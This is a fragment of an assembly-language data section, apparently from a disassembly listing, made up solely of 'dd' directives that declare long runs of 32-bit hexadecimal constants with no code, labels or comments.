		dd 0C1BDD64Dh, 60CDE415h, 3CCB559Bh, 6F02CFC4h,	24B04E27h
		dd 8C8AC63Bh, 5EA0680Ah, 0C5771B63h, 0D76E7241h, 48C327BFh
		dd 12D23CB7h, 0F9E0BEB4h, 0C4448F43h, 43A599CCh, 1336E60Ah
		dd 6DE9F980h, 0A7FA1DCFh, 3F571BD5h, 0E17ABF19h, 553BEEF8h
		dd 0C9FA1CEAh, 544E0FFDh, 0DC1A2672h, 30289297h, 3C6AF5B8h
		dd 4D01EF6Bh, 550C0BD2h, 8BF21E5Bh, 4724623Fh, 6B5EA164h
		dd 16A422F2h, 160578Fh,	27A091F2h, 0DE512ED2h, 980E827h
		dd 0CDF82BAEh, 0DA09B10h, 0D7871CEEh, 7A2534AAh, 1A9B6C83h
		dd 8351E1FBh, 0C0E5D6F9h, 514057E3h, 0C93A2E38h, 30A9FBA4h
		dd 0E0BDBD5Ch, 6C045AAFh, 0E58D235Fh, 6BAFDE29h, 16C6BCCBh
		dd 0A177BA0Ch, 8BC4D615h, 36563069h, 0CF62F690h, 0FB7059BDh
		dd 3AE23B87h, 0BDBB9EBh, 0B11D70ADh, 0F3E34679h, 1E42DD41h
		dd 0C39E6F3Dh, 0E81C1647h, 0BA7AD900h, 0C094DE12h, 0BE7D3C22h
		dd 1D1D775Fh, 0C30C4EDh, 0A6F25A26h, 0FD2BA631h, 0DCC2E0EDh
		dd 87B46365h, 0AEB0F7CFh, 31F6F25Fh, 53A84EA3h,	74198B65h
		dd 3746471Ch, 2BD78C35h, 3D994FD4h, 27602317h, 61E7DA0Fh
		dd 3064042Eh, 9B4206F4h, 1B0CC88Ch, 271641B6h, 0C2E98A82h
		dd 0D8426EFh, 0A655C109h, 0A2F62C54h, 0A1BCB14Eh, 0F385321Ah
		dd 0FDB8DEF6h, 0C6AFFDCh, 0D11F4144h, 1D9FCD60h, 7A0EC892h
		dd 7A7238C3h, 0B6C96C4Bh, 0F0785FF3h, 0CBEBF20h, 410C022Ah
		dd 4D887A5Bh, 9FD47354h, 0DA93A65Eh, 0C059F12Ah, 2A2C9647h
		dd 8F97BE35h, 1634228h,	0AEC96034h, 6BE208C4h, 0A3C37E65h
		dd 9534BDEEh, 5876F977h, 0A9E833DCh, 0D2BA6759h, 1F7226D6h
		dd 2C022F9Fh, 71007044h, 54E07B35h, 5DF35FB1h, 3EB6E9FAh
		dd 0EBADFA20h, 0EC80EE0Ch, 32B77A33h, 7369EC3Eh, 4EA70C10h
		dd 2566AAA1h, 4A14AE8Eh, 7D746C57h, 51584D24h, 147EC335h
		dd 0E1BEBAEAh, 535F4EF4h, 589A674Fh, 89F49FB0h,	6CE34BC3h
		dd 8A5A5716h, 42F0A162h, 2EA01BB6h, 5DCC7875h, 42DE4E56h
		dd 0AF1CD1FFh, 9DA481E3h, 0B544021Dh, 90BB725Fh, 0DA03F807h
		dd 4ACE28C3h, 3EC89F07h, 386B2EA7h, 1B0736A2h, 8FF726BCh
		dd 3254027Dh, 2DB768C2h, 0D0165EC0h, 0C51EAE5Ah, 1E4D8F5Ah
		dd 0D932C8D8h, 520C5F24h, 81519672h, 8DB39D28h,	0A78C0F23h
		dd 0F36CF64Bh, 0DBFCC4AEh, 0AC422C6Bh, 920FD783h, 69612D38h
		dd 0EC537F9Ch, 0EF20655Bh, 0B2F675AAh, 0F8FC4541h, 1E9C5ADh
		dd 0C2BF5464h, 0C12C6E97h, 0A7856295h, 0A4672F51h, 0DC8A41F1h
		dd 93B2057Fh, 9E1C9844h, 13C3064Ch, 1D839EBBh, 8A0F8BD1h
		dd 2CEBFD16h, 73B51231h, 1CA349B7h, 0B2576932h,	2F0FEB73h
		dd 451B0C53h, 7FB0F3B7h, 0D93151C2h, 2BF22359h,	0B37474C4h
		dd 7DD2DCA5h, 60F2F806h, 6A773035h, 15C8090h, 0A200AEA9h
		dd 0CA2032EEh, 47DCEE1Eh, 2D5A1870h, 0A871B60Fh, 73442776h
		dd 0F8512102h, 336CFD86h, 0DB3D3E31h, 72E329D4h, 0FD1DB94Ch
		dd 951B021Dh, 2ABB7E09h, 2D4E471Ch, 0B1EFA85Dh,	532D8F7h
		dd 901D4809h, 3A1F9F2Dh, 19A5A326h, 0C1009FAFh,	7CFE4C05h
		dd 6F3A85D7h, 2F8C3B76h, 9BAB966Fh, 8C3D04B3h, 4053FBB1h
		dd 0D5D389CDh, 0B22A5673h, 2EFEB89Dh, 961BBA4Ch, 69F8F922h
		dd 14F36A5Bh, 41DBA385h, 23408986h, 445E474Dh, 0DDF2636Fh
		dd 1A703829h, 8E35F1EEh, 4B0D81DAh, 0F6DE77D0h,	2D1E29F8h
		dd 0A9E1FA3Ah, 4879B644h, 0CBF84F00h, 7352137h,	44AC108h
		dd 0B429E1BCh, 64A979AAh, 0B9AC87B2h, 966F6102h, 2A542DDAh
		dd 61BAB78Eh, 4F662EE9h, 210B73DAh, 0C1D4074Dh,	920FCFFAh
		dd 4827EA63h, 0BAA69DACh, 0A921954Ah, 2DF59670h, 0D9137015h
		dd 539C9FB4h, 0E663B09Bh, 782B746h, 3031F182h, 0B48C8063h
		dd 646A79FEh, 0BC50E293h, 4D0A5C21h, 5DDFCDC4h,	6D24B0E4h
		dd 0B6CBACCFh, 2459485h, 0B62CE9E6h, 0EA705936h, 7A26AC33h
		dd 46C56425h, 9353111h,	0D23E2168h, 3885A6D1h, 0ACDF8E8Ch
		dd 0B8487F67h, 87A3448h, 0C2CBEF7Ah, 0B44AA758h, 0BFC38E0Ch
		dd 72E4D8Ah, 0C1545A0Bh, 5C6C02C1h, 62AA28D5h, 0B98A17CEh
		dd 1646F409h, 0CF1ACB0Ch, 0A3A479DDh, 0D10DBC01h, 27B41B57h
		dd 5321C750h, 8FC12F19h, 0D055D724h, 1A3EEE86h,	64CA4F32h
		dd 0F5C2EB47h, 30E09A69h, 0ACD078F5h, 9F3A72B5h, 290248C0h
		dd 0F9683526h, 737C9B2Eh, 744BEFD4h, 3A950DF3h,	5E4C1D47h
		dd 1E21F83Bh, 0FDEE5F9Bh, 4B61909Ch, 0A7F695Fh,	4F58B951h
		dd 0D22F43BAh, 0D0428FEBh, 0AC0060A6h, 0C0164F01h, 0E81752F1h
		dd 0E6BBA51Fh, 7D064DEh, 1AF04562h, 4426FE96h, 88E39853h
		dd 8BB12D5Fh, 1ACB40D6h, 4B601398h, 749DCA48h, 96A9071Eh
		dd 0D3873F4h, 0B98DC616h, 9321BB13h, 1B4246ACh,	0A29A96C6h
		dd 0C76FE1D9h, 40B4C925h, 0B348F1D4h, 10E4DE27h, 0FD2FECF8h
		dd 0DA7F5A55h, 56EA8561h, 7E53814Fh, 20BFF521h,	8305DB44h
		dd 7AF7CEB6h, 0B13AAFECh, 2D99AC67h, 3C9612B5h,	9C03862Dh
		dd 25206CD0h, 2779844Ch, 8E124390h, 5CDC4507h, 0E951641Bh
		dd 0F44BA1B6h, 2CA6F964h, 3ECCD6CEh, 112D458Eh,	0B4EAF7BFh
		dd 0A641B969h, 0C0225320h, 0F8D56DF1h, 0A6C6FD81h, 0BAF20270h
		dd 52924216h, 36885365h, 422A0048h, 2C6E6991h, 858505F1h
		dd 0E65ED3DAh, 8E21F842h, 22DC5B01h, 0EF07048h,	61CFBD64h
		dd 2234A3E8h, 4F232185h, 0DFD27674h, 66341C66h,	7D243240h
		dd 0BE327CEFh, 96E7F638h, 1B122023h, 9E9B67DCh,	5ED4B679h
		dd 0D1A71A48h, 0D5800795h, 9372F1A9h, 0A0D34B6Bh, 6A6448A8h
		dd 983FE72h, 35E82C1Eh,	12F8BE72h, 0C4269EBFh, 6D803843h
		dd 880FBFECh, 3021C1CFh, 0BDEA3316h, 8A5709CCh,	0F9A38D74h
		dd 72A56212h, 8786201Fh, 6EDA0806h, 4AAE53EEh, 8DAC5366h
		dd 0CA10FC09h, 3CCF9EE2h, 8F9D34E8h, 0AED73FD7h, 0EC8F0000h
		dd 67C59F46h, 1DA0B30h,	0C1A75581h, 0A2EBBCDBh,	14062F46h
		dd 518C6A47h, 9BF530CBh, 2AC09FEh, 86B67F00h, 0F75CCBACh
		dd 287696DAh, 0AB646C32h, 0FB481A84h, 72FE6622h, 39C92FDDh
		dd 37FCB02Dh, 3CD75928h, 5B09E71Ch, 9470B8Bh, 0D4129647h
		dd 2F8A08CBh, 0C4C9FE6Fh
		dd 4892CB31h, 7E21C71h,	0DD2EE4F9h, 6C4B56C7h, 7D280492h
		dd 3059BA4Bh, 0BE0703B3h, 8C8BB5C7h, 70BD3033h,	2264F7CAh
		dd 8497B626h, 114BBC2Eh, 4562F1DDh, 60A855FCh, 572365D7h
		dd 2547C0Ch, 3A683BEAh,	0A11740BBh, 0B6522491h,	840EB41Ah
		dd 3C0A6B57h, 3032EBDFh, 0E74F5D65h, 98BC0D54h,	35C42720h
		dd 4BB5B1C3h, 4ADB3486h, 544C0E1h, 11EDEF73h, 191BE8F7h
		dd 0C7962EB0h, 0E64FC82Eh, 0CAC5C104h, 27EA31A7h, 3361FD27h
		dd 0CA2769F1h, 7BE15672h, 0C1A205B3h, 0C381BEBFh, 0B7A6218Bh
		dd 2D49CC06h, 0BADC48E8h, 9ED381CCh, 8FE448F4h,	14969526h
		dd 842CBBCDh, 12D1F016h, 0B0D2B9C7h, 997F3EBh, 4B94DE8Dh
		dd 0BEE08D1Ch, 0CCD2CC42h, 0E6940941h, 0B9FF408Bh, 2DC6DEABh
		dd 0C7AAD553h, 6516AC02h, 0BBB041F6h, 0E140E1EEh, 5BAB2C75h
		dd 0D6E1BB69h, 7B64728Bh, 6A2685C7h, 0DEA84A14h, 7AD2F651h
		dd 0CC7FDADAh, 5C2472B4h, 0B63A565Eh, 56FBD3A4h, 0E1107542h
		dd 6C815665h, 0A81C9AA5h, 0D6DECB18h, 0BEC1E25Fh, 44E1E7F1h
		dd 0FE6C36A3h, 0E43BF68Dh, 9C273F46h, 3FD6377Fh, 9EC93CAFh
		dd 8E19B6EAh, 4E449C4h,	580FB37Ah, 0B1AF4F30h, 0F59FEE99h
		dd 489EB765h, 0D2CCEEB3h, 7E385D1Eh, 0E1EDAB45h, 0EF4BE48Ch
		dd 20396B25h, 0F7B6BC0Bh, 7F3B0BFDh, 0FF091946h, 54D756A5h
		dd 608395FAh, 0C9551C57h, 615A0EFBh, 0B4F4D2E0h, 0B643BB94h
		dd 2F3D384Ch, 1DEF932Bh, 9DDF8AEDh, 64193D23h, 4E56E4C5h
		dd 0D5CD40AEh, 0B6EB06E7h, 0AB8FCC41h, 0C903191Ah, 0D0DC475Bh
		dd 0D3F4CBD3h, 0D2C3EBCBh, 0B61D612Ah, 0CF346CDEh, 438987BEh
		dd 0F96621ABh, 1B61F77Bh, 3ED90A6Ch, 0DEAC8251h, 0A55E1EDBh
		dd 2168F785h, 0C68EEF44h, 0A043F1CDh, 0DD0683F9h, 0CC9B4603h
		dd 1972B012h, 586A5F6h,	83E3C2D3h, 0AB616C5h, 62A64BDDh
		dd 0EF79AA2Ah, 0E764724Dh, 0DAC998E8h, 0AA483364h, 2C095FAAh
		dd 0F353C6B0h, 1462586h, 100E0B9Ch, 46CB2C54h, 6C08E8CCh
		dd 65F2A0C3h, 46FB9E10h, 4F578FBFh, 64FC3D9Fh, 5E660AF9h
		dd 0F862C05Ch, 54BA3F80h, 1AF78F3Fh, 0D70E4C4Bh, 0F656E0AEh
		dd 751D5C1Fh, 0BA486290h, 2C8B3988h, 99EEF551h,	0E93CDA9Ch
		dd 9D3197BBh, 0E9F0361h, 468F38E8h, 0CBC56206h,	74871BAAh
		dd 918AC7E0h, 0D720D8DBh, 4CB0A1ABh, 0B681A3EAh, 7C6B1E58h
		dd 0FAE8F1D9h, 623BDABBh, 0F1A76949h, 0EDDEFA55h, 8AC6BA95h
		dd 7A0DCC63h, 0EFE0C75Dh, 0AA2161DAh, 0D871202Bh, 9D43B65Bh
		dd 7353DCE0h, 0FC694BC4h, 8DCDE4FBh, 5C524A7h, 9D2D8FFFh
		dd 0B87E9B22h, 71D7DEE8h, 62B4CFE0h, 8D7984A4h,	5662CFA5h
		dd 0CCAA381h, 11014BD4h, 0A04683D6h, 15CC605h, 42DC2B58h
		dd 65E1C36Fh, 68D20ED1h, 120D16E9h, 0D2FC7177h,	8C47711h
		dd 23A58044h, 0A6659F1Dh, 6B3BEB01h, 0EBBD110Dh, 3C142916h
		dd 8CABA412h, 0C8E6E59Ch, 3A8FE6D6h, 0AB1E425Bh, 53CACA64h
		dd 6E14EF44h, 0BC13C70h, 3D0C1788h, 5B64E431h, 5CDE3BEBh
		dd 0D3D5ECB5h, 359A9125h, 2846791Eh, 0BD351A8Bh, 71743F44h
		dd 90F1DF97h, 1F7DAEFBh, 676C8788h, 880E95C3h, 0E3F2659Eh
		dd 3D7E182Ch, 674AB316h, 222A69DDh, 0AC74F19Eh,	0EC40827Eh
		dd 5C42E9ECh, 376CABE3h, 0EC981A73h, 0D31A94B8h, 4A8248Eh
		dd 0F391EE91h, 0C0BC62CBh, 0BE442780h, 4BA5CB52h, 1FDC64B6h
		dd 4B0C8DC3h, 0D6EFA09Ch, 4C7D888Fh, 5E046673h,	0AF4B4A17h
		dd 94950951h, 0E8DBF659h, 258DBFAAh, 23EA2BACh,	398DBC50h
		dd 0DDFD7427h, 0EE7F2A43h, 0BF0792CCh, 0DDD1E29Eh, 2D76C081h
		dd 0E2C9A3FBh, 489C1269h, 8AB30320h, 741790CFh,	0CC8732E3h
		dd 6A28A600h, 232AEC95h, 0C8325370h, 352EDFBh, 75AA7720h
		dd 0D2A07B36h, 2CF9B245h, 0E732D3EBh, 77EF360Dh, 9D950FFFh
		dd 37A49291h, 6FDB6548h, 0D7B05C63h, 0E871E30Ch, 0F2231818h
		dd 0D5836448h, 4436F82Eh, 543EBA0Eh, 1D1EB941h,	54B96701h
		dd 6C17DEFCh, 0F8FC8FAAh, 2C0823A3h, 90CFED80h,	2B7B6B04h
		dd 676F2B59h, 66BB3A4Eh, 260A8DB7h, 23139D8Bh, 993104F8h
		dd 6D9946DBh, 4B263590h, 6DD6A1FBh, 8BD4B017h, 95719815h
		dd 0AEC4EC4Dh, 298ADFC4h, 203D136Eh, 0BCEC8D21h, 58B82583h
		dd 86BB609Bh, 0CAC2BC14h, 824834F7h, 0F1A4AAF4h, 0AD8FBFAEh
		dd 0C1D7B425h, 4A7BE28Eh, 3164382Ah, 0D7DB0B32h, 197B239Bh
		dd 987A9E1h, 0ED41DA4Dh, 95D35370h, 21C27843h, 1EE2BFADh
		dd 2D04533Bh, 0A6F1181Fh, 26B747B5h, 79BBA1D1h,	0DA8422F1h
		dd 0F1D5583Fh, 0C6A8EEE0h, 89DACC8Fh, 0E6CA16A3h, 0FA1116DFh
		dd 8F38613h, 6B42B74Bh,	8322A757h, 0AF0F569Bh, 2197B33h
		dd 40DFDDABh, 8BA61190h, 571C3D58h, 25274362h, 0A57C6551h
		dd 60389BD6h, 1C8F06F6h, 4C12739Ah, 0DE181398h,	2C61496Eh
		dd 0F7533277h, 0C14C5980h, 46618CD1h, 1C7132C0h, 201531D1h
		dd 0AF97A9Eh, 7ADC06F2h, 13DF9821h, 1C12627Ah, 9A9DA9CAh
		dd 849EA35Bh, 1E75CB9Bh, 0D02179B7h, 0FA4BB250h, 0C7CF3C1Bh
		dd 3F6AC791h, 6567E3D2h, 84511DF6h, 0F3C2B871h,	0D754CB6Fh
		dd 10C3941Ch, 9F6FFCFh,	8A7AE083h, 0A6529C28h, 0B8A7AE3h
		dd 0DBC10FE4h, 103B26ECh, 23122D17h, 3B265024h,	7C7895CFh
		dd 0F07D0561h, 13316D85h, 0F9183B8Ah, 8EAC94ACh, 0DC815BE5h
		dd 0FF43FDF4h, 7B412515h, 801E943Dh, 0BB53C975h, 0D9DFA208h
		dd 5EC25EB0h, 0A9F307A4h, 70D2E824h, 0D5ADAEA8h, 678819B2h
		dd 0D2E87CDCh, 2FEB5E5Dh, 66BA49D2h, 732CCE41h,	0E102E51Ch
		dd 1D1FA411h, 0D7BC1122h, 1C5ED164h, 4DBDCFB9h,	0AF60A62Eh
		dd 97C29877h, 882BBF59h, 63375E8Dh, 21CC40DEh, 90D962CCh
		dd 1BE200A7h, 4375C1Dh,	33881783h, 0CB3AD739h, 1C9B7564h
		dd 91FBF697h, 5D9E77D8h, 0F6D7FC09h, 0A548330Ah, 9F331F4Ah
		dd 0DD84C523h, 0AC069AA7h, 59EC5519h, 9E0EA175h, 51A97EC2h
		dd 2CCA7D30h, 9DC904E0h, 6E72E5F9h, 0E5FC718Bh,	4CFF6BA8h
		dd 4DAED679h, 9B9A1843h, 7E140E08h, 0C8936140h,	0BD1C1E9Dh
		dd 866ABC05h, 0F3264F6Bh, 197DBF60h, 0C5B5F59Ah, 2D644FADh
		dd 787A4721h, 0A81DB61Ch, 0EC1D14D7h, 8B804CCDh, 8F96E805h
		dd 0DD44BD6Ch, 0F3A4E8FDh, 0CFB26BC1h, 0D268BBF2h, 31EAFFB6h
		dd 0D7677822h, 0FE718A1Bh, 655FF467h, 0B1A34632h, 69F3DE72h
		dd 0E7C8B0Ch, 0D58202A8h, 4D5C79C4h, 68B10516h,	0CC1D2595h
		dd 1DBAA382h, 0C1624CD6h, 0C5D26F45h, 0DA226961h, 5F733E01h
		dd 0B81C5772h, 2931001Bh, 57E598B8h, 0C44AD48Ah, 62838C33h
		dd 9D3CE0A3h, 0C9D327F3h, 995C445Ch, 0C4DF5AAFh, 343EEAC9h
		dd 441319E0h, 407A964Ch, 8669BF1Fh, 50417415h, 1747A007h
		dd 0A4DE79A2h, 66F90741h, 0F925E037h, 20F68B44h, 0D87369BDh
		dd 81830529h, 0BCF5D60Fh, 840E69B0h, 0C173965Ah, 0C42C4CFh
		dd 9A387626h, 9AA7A061h, 0E3C3A8F4h, 8346EA19h,	4F0DC909h
		dd 0CE013C4h, 433A23DEh, 31C996B0h, 4C9D03A9h, 0F4E763A4h
		dd 2AEBCC9Dh, 1CD7CB3h,	564C09C2h, 0FF5CD73Ch, 523BA204h
		dd 5ECC7389h, 22066679h, 361EF401h, 14568297h, 5FDC5DCAh
		dd 6172DD6Ah, 4EBDC74Fh, 0F6214B1Eh, 0C9A77110h, 0B7D5884Bh
		dd 84CC7CBFh, 0EEFEFBD6h, 67FEA33Fh, 0F4E7C904h, 21BD4102h
		dd 8CCC0DCAh, 56F6ED43h, 3259F769h, 0CC768E01h,	0A82CCC03h
		dd 9B3F4C05h, 99E4FE85h
		dd 54581F2Ch, 6D1D6B70h, 0D9EDF4Ah, 39F3474Bh, 0A250B043h
		dd 27806D00h, 1545CD8h,	0BB294E0Fh, 62984386h, 92D966F6h
		dd 1E0493ACh, 73704AB1h, 8A512AD0h, 0FD718EC8h,	4CF61192h
		dd 37AAE11Ch, 0E03F52B2h, 0BCC0A7B0h, 35267B36h, 47F66E38h
		dd 0D69EBFBEh, 81BF51E8h, 3A7851B0h, 537EEB7h, 0E37156F8h
		dd 460A5A90h, 0C164632Dh, 67407D1Eh, 36AEC1D7h,	2308BA5Ch
		dd 0BDDDE4DBh, 0EC72BDD2h, 15FEC3F1h, 0F788E495h, 0B6C2FEABh
		dd 1CD0048h, 0B1C78B16h, 0C771AFF3h, 0C2D07DEDh, 0EE1FABBFh
		dd 5A09F066h, 88FD2510h, 8C7ED72Bh, 0CCA32390h,	0E71BDA38h
		dd 3CB8BF16h, 82364353h, 0B59E92F1h, 44749BDCh,	4C684450h
		dd 91C826B3h, 0FBD58C08h, 0F1749D28h, 0C3B82595h, 0CC08EB5Eh
		dd 78DF1377h, 0CCEF7D26h, 45F8A868h, 0FD875F5Ch, 0DC771738h
		dd 0BED2EC46h, 0B023F03Ah, 9BC11D0Ch, 0FB3D748Ah, 170BD134h
		dd 0BBE3D4F3h, 47969936h, 76D7F7E2h, 6DDBFB77h,	7698C04Fh
		dd 66F5C8A3h, 107AEB5Dh, 2D0FEF8Ch, 0F343BF20h,	0F1DA60F1h
		dd 62296D17h, 0FC8691FFh, 0A7F77167h, 0D81FAAE5h, 0B0DD312Eh
		dd 0F6197AB1h, 92B72958h, 5C667327h, 3B55F54Fh,	0E2B0FF8Eh
		dd 0F80DFCC8h, 0FBD7EA63h, 1910289h, 0F1A07C88h, 5AB199E4h
		dd 3856732Fh, 692AFA78h, 814BD85Eh, 0ECCFC831h,	0AB90A507h
		dd 448062CEh, 6B578300h, 0CC852045h, 37FF305Eh,	0CC9BF957h
		dd 6E2E9F84h, 7D2E7C63h, 0E8B955E7h, 732A9CA1h,	0AA2F9EF5h
		dd 0FCEB18E7h, 9687ECC8h, 32828D3Fh, 0C1B41316h, 0B6798EB0h
		dd 3E914AEAh, 3E010122h, 0CD8A206h, 0BB675966h,	17A59DDh
		dd 667788B4h, 0DE54F06Eh, 4694AC2Eh, 642CB7BAh,	161A3603h
		dd 0E2E57FD4h, 63B81DDEh, 0AE122F96h, 0C1623149h, 36880119h
		dd 0E6240B42h, 0A17E62D9h, 0C0893590h, 8DAA7CC7h, 0E6754F2Eh
		dd 0D8A24B92h, 71F7C991h, 1D921E37h, 3B66CB1h, 0C664F716h
		dd 2A7A2EFCh, 39494DFh,	0B1334F92h, 9BEE3798h, 0A66949E2h
		dd 9DD19922h, 7BB2D556h, 0A99D2ED2h, 9B04898Dh,	1A03A8F5h
		dd 360E1938h, 2A745E60h, 0BBA93D2Fh, 8BF9B3EDh,	79720B48h
		dd 0EF3040BEh, 19599C68h, 6E550A4h, 0AC86ACFEh,	613FB6C0h
		dd 48929708h, 814DE58Fh, 5321F378h, 11E67ECCh, 46C3F40Eh
		dd 40D46642h, 413F1225h, 3F3F23AEh, 27391470h, 5B88C45h
		dd 0F5CD8E49h, 70318579h, 0C73D57B5h, 930EAD8h,	46BDA0EAh
		dd 51367D2Bh, 9E4A7181h, 0ED6CFCCAh, 290FE3A5h,	0A9E3DABh
		dd 4849D35Ch, 7C980A3Ch, 0E6082E03h, 47EBF9DEh,	977C95C3h
		dd 72972C9Ch, 67BC7316h, 5AA67C16h, 0B76CF5C4h,	174ABB45h
		dd 22D6E8D5h, 31E69C22h, 0C3F68A7Ch, 15CAEA68h,	0D0C69788h
		dd 6A1FE3E6h, 0BE3B3C2Ch, 9C59F740h, 84BAA653h,	4BC5765h
		dd 0B9BFCF90h, 76A38F46h, 0F9F6BFC3h, 8D2AD069h, 0C472CC6Fh
		dd 356B8A4Ah, 0B3D378ECh, 0A54133A9h, 0AE8FD895h, 54FA0C4Fh
		dd 13E10887h, 0F0D073Bh, 4105E70Eh, 8C795FF1h, 41F2EA9Bh
		dd 4777281Fh, 9D30B7C3h, 0F3A45A20h, 91A4FF0Fh,	0D114EAB4h
		dd 50C4A92Dh, 15293200h, 6CEC9405h, 7015C61h, 7C9F1D8h
		dd 79F4B913h, 9C9D2157h, 4E014EFAh, 0C2C915Ch, 3F0D81A1h
		dd 8C9AAB52h, 82B974BCh, 0D1B58D3Eh, 0B7F48754h, 8E9DF738h
		dd 0BA0AF835h, 5C2C30C4h, 0ED3A12Bh, 0CF87BEFFh, 0CA1B1F33h
		dd 0D50493D5h, 0DCAABF7Fh, 0D75A5608h, 2650132Fh, 812498B9h
		dd 7BA34090h, 111D8BF9h, 2EC9691h, 2968FF8Dh, 0B514A2DEh
		dd 0B17F79C7h, 13F31B75h, 0E9F609FFh, 0C629D11h, 41B375FAh
		dd 0A491E491h, 0CC3C9A87h, 12DA256h, 0BF2FE50Ch, 72438413h
		dd 0AB235244h, 49089C48h, 0BB118D81h, 28091173h, 5B015285h
		dd 2824EB66h, 0A1E97E64h, 0AC36AAF1h, 62977734h, 0BCA0562Bh
		dd 0D469FA95h, 7C2415E8h, 20BA0735h, 0A78B465Bh, 2DF07555h
		dd 0C602FB1Ch, 0D8FD5A8Dh, 2A82F462h, 0CEC64C16h, 0B5AAD39Fh
		dd 2465EA5Ch, 0F447EEBEh, 2EED4307h, 0AD4CEFD3h, 14A66BF8h
		dd 52FF2078h, 12F09C16h, 367022E2h, 5A8D436Bh, 0D33B07B1h
		dd 0A2F7D6B5h, 0B849F561h, 73E12628h, 3D9079CAh, 0E9CAE8B0h
		dd 30D87085h, 548C26B5h, 0A75801FCh, 0F2D25C3h,	5837271h
		dd 6A40CFD1h, 847A5E2Ah, 7AEC6BEFh, 10A21D9h, 39E17754h
		dd 71C39BA1h, 0BDD751D7h, 6E9AE6DAh, 0CA8B0D24h, 0C7B858D1h
		dd 0D27DFBDFh, 526CB925h, 79D9A594h, 0FFDD5BFEh, 0BD6E0B3Ch
		dd 0E029B389h, 1872FE83h, 532DF19Eh, 69A0F6A7h,	31200451h
		dd 0B94A6593h, 0D07273D5h, 5548FE44h, 2F92B73Eh, 0C3C3F8B7h
		dd 6330FB2Ah, 0EA20CB2Ch, 2423515Dh, 3EA2E4E8h,	75CDCD16h
		dd 0EE789A30h, 0EF3884A6h, 0BEC9E08Ch, 45179CECh, 18444FB2h
		dd 0D0B21ADBh, 1449FBB3h, 64535987h, 0A847D5D0h, 0BAACD920h
		dd 0B56D9672h, 6B75D34h, 75CC5DA2h, 33968F8h, 6A498355h
		dd 3D027D64h, 0BFE414B9h, 666A4306h, 0C66720F5h, 0BFEE11E8h
		dd 923AEA13h, 0E5B6247Fh, 792999DAh, 96128C1Bh,	71EED46Fh
		dd 0BBE3899Dh, 9206C628h, 0BF75AA94h, 0EAF11100h, 37F81F4Fh
		dd 693C0F05h, 0C85503C7h, 482D834Fh, 40DCEEBCh,	8E7786DFh
		dd 0BEF6C7C4h, 0A9C26ABBh, 7A301A78h, 6F65E83Fh, 5DC4110Ah
		dd 0A65A5BC9h, 4F9E6080h, 333D83C4h, 0A47D6F73h, 18BC656Ah
		dd 474D6616h, 0A6642C1Fh, 0A2BDA1FCh, 328EEB5h,	0CAFCC0Ch
		dd 0C12B82BDh, 128B120Eh, 4E1746FDh, 0BCB2E1ADh, 67EB94DDh
		dd 0A1C6C6Fh, 0D0F980ACh, 49411051h, 2B1BE2B5h,	0C7E3C8CBh
		dd 0FFAB6F5Ah, 5DA97DAFh, 0B9D71399h, 804518E5h, 0C4C24CE8h
		dd 0B7FFEE4Bh, 3C7489F7h, 85D0D7D1h, 0EE188618h, 4F81AC11h
		dd 0AC22A5D2h, 0AC3775F0h, 3185ADD5h, 3975A07Fh, 0C1E0E844h
		dd 0CDFB101h, 0EB9AF59Ch, 0A0464D8Fh, 167DE1F8h, 15AB73B4h
		dd 0E2AF5EAFh, 0A02D3938h, 598B96Bh, 7BB271EAh,	0B8E38CA1h
		dd 0FB245EE9h, 0A9CC6C87h, 42470A8Dh, 192F9119h, 268D9F6Ah
		dd 964C5332h, 902AFD82h, 6C984284h, 0D3F488EDh,	0F2DCD70Dh
		dd 844A9B63h, 1CF1FEh, 0FF64B348h, 0C7D4235Eh, 95BFE29Eh
		dd 23776520h, 0CB7377DCh, 64480646h, 0FF0A427Ah, 17AC34B7h
		dd 9C79B612h, 123ECC0Dh, 910E118Dh, 0FEF77C96h,	84AAEB83h
		dd 27A87B51h, 7634AC5Fh, 0D0012574h, 770647E5h,	36029E4Eh
		dd 0B87AAF95h, 0B81E8BD6h, 0DBBE4315h, 6A53233Ah, 0D28739A3h
		dd 4886081Dh, 0E4DCD191h, 6AE1C07Fh, 9B694EBBh,	5301B0CDh
		dd 4D8387F3h, 0E78EEFE6h, 0F64C4ACh, 311B2E48h,	0BC97AB35h
		dd 0ACC920F0h, 87F083A1h, 0F843EE20h, 5A3F7E87h, 0ACEBFD76h
		dd 79079932h, 0FC28F2A2h, 0FA58938Eh, 8B048419h, 3CB32782h
		dd 38F1E872h, 72CC41C9h, 89EFD929h, 0EE2C0418h,	362DB8C8h
		dd 80E26ACDh, 0DDEC6FB8h, 3E6C285Eh, 3C058C8Ah,	4089E18Fh
		dd 1F44E4Ch, 65A0C2C7h,	26337500h, 0E6CE6E4Dh, 29671A1Dh
		dd 76650960h, 0F39C61DBh, 2B023611h, 0C8869FBh,	0F1B3BAADh
		dd 91FD25EBh, 4B9ACEF5h, 0B43EC025h, 0F065826Ah, 16D6B291h
		dd 7A5609DBh, 0A6567249h, 3709F76Fh, 69632CDCh,	0C6E0D1C3h
		dd 917DD829h, 3A99F000h, 3344BAE7h, 3FEBE53Ch, 6D6F5E2Ch
		dd 3DF9901Ah, 0C51A3124h, 0B4CCD311h, 9D6AB0DFh, 9E98D1D1h
		dd 56BF8852h, 0D7F8DA26h, 436079D4h, 0A93F48CFh, 3BAF262Bh
		dd 0DEF09B19h, 2833A455h
		dd 881E3EE9h, 9427C622h, 31C4157Ch, 0B90FCF8Fh,	95F65EE2h
		dd 3BBF946Bh, 0C8AA5491h, 1D48EA5h, 0DDC4697Fh,	8A1091F2h
		dd 0C7515042h, 3FE958C4h, 3C514433h, 897FA94Dh,	768DAC3Ch
		dd 64EC9365h, 635BAAE7h, 1B7E52B0h, 5B0A6B1Eh, 0F498AD73h
		dd 0B8833C57h, 5115A947h, 6AC3FA4Dh, 57FB1141h,	2BC5C4F0h
		dd 15BD31EFh, 0F7EF1795h, 5A2C3AB4h, 0EB3FD60Eh, 0BA91F296h
		dd 0D6C35B7Fh, 5723EE19h, 73BD6245h, 0B6FA48Ch,	0A4CF2338h
		dd 0CAA1D5A7h, 6FC86A79h, 0DAB72EE9h, 8BABE436h, 8CFBE668h
		dd 31885C69h, 0CE660D2Dh, 1DB389E1h, 0EFA7E4A2h, 57986BCCh
		dd 69C7D4F9h, 0A35F3696h, 456EA0FFh, 3D91E6B0h,	0E87B2DEDh
		dd 3A1D9893h, 0F805D70Dh, 0D9A75219h, 0A1BE4FCFh, 74E8BF68h
		dd 65B6308Bh, 0B58DAB00h, 36A81D36h, 0A17D651h,	74D5D144h
